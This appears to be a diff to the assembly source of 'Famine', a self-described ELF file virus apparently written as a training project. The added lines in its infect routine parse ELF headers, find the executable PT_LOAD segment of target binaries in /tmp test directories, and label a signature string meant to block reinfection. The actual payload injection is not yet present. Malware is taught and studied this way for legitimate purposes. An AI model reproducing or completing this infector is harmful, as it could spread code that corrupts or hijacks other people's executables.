@@ -244,6 +244,8 @@ _infect_file: ; (string rdi, stat rsi)
 	push r9
 	push r10
 	push r12
+	push rbx
+	push rcx
 	push rdx
 
 	push rsi
@@ -284,6 +286,8 @@ _infect_file: ; (string rdi, stat rsi)
 	push 4
 	pop rdx
 	call _ft_strncmp
+	push rsi
+	pop r9
 	cmp rax, 0x0
 	jne .unmap ; not elf file
 	cmp byte[rsi + 16], 2 ; ET_EXEC
@@ -296,9 +300,50 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rdi, rsi
 			call _print; _print(rdi)
 		%endif
-	; things here
+		; TODO: ft_memmem with signature => don't infect
+
+		; get pt_load exec
+		mov rsi, [r9 + 32]; e_phoff
+		mov ax, [r9 + 56]; e_phnum
+		mov rdi, r9
+		add rdi, rsi
+		xor rcx, rcx
+		.find_segment_exec:
+			mov ebx, [rdi]
+			cmp ebx, 1 ; PT_LOAD
+			jne .next
+			xor rdx, rdx
+			mov dx, [rdi + 4]
+			and dx, 1 ; PF_X
+			jnz .segment_found
+			.next:
+				%ifdef DEBUG
+					push rdi
+					push rax
+					push rcx
+					lea rdi, [rel signature]
+					call _print
+					pop rcx
+					pop rax
+					pop rdi
+				%endif
+				inc rcx
+				cmp rcx, rax
+				je .unmap
+				add rdi, 56; sizeof(Elf64_Phdr)
+			jmp .find_segment_exec
+		.segment_found:
+			%ifdef DEBUG
+				mov rdi, r10
+				call _print; _print(rdi)
+			%endif
+		; header->e_shoff => 40
+		; phdr->p_type => 0
+		; PT_LOAD => 1
+		; phdr->p_flags => 4
+		; PF_X => 1 ; pt_load->p_flags & PF_X
 	.unmap:
-		push rsi
+		push r9
 		pop rdi
 		mov rsi, [r12 + 48] ; statbuf.st_size
 		push 11
@@ -318,6 +363,8 @@ _infect_file: ; (string rdi, stat rsi)
 		xor rax, rax
 
 	pop rdx
+	pop rcx
+	pop rbx
 	pop r12
 	pop r10
 	pop r9
@@ -427,7 +474,7 @@ ret
 elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 dotdir db `.`, 0x0, `..`, 0x0, 0x0
 directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
-db `Famine version 1.0 (c)oded by lmartin`; sw4g signature
+signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
 _check_end:
 	call _back_host; push addr to stack
